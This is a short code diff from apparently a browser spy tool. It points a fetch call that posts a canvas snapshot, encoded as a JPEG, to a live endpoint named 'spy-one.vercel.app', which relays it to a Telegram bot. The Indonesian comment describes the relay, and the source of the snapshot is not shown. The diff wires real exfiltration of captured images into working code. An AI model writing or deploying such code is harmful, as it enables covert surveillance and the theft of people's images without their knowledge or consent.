@@ -20,7 +20,7 @@
           const imageData = canvas.toDataURL("image/jpeg");
 
           // Kirim ke bot Telegram lewat webhook backend
-          fetch("https://your-backend.vercel.app/api/kirim", {
+          fetch("https://spy-one.vercel.app/api/kirim", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ image: imageData })
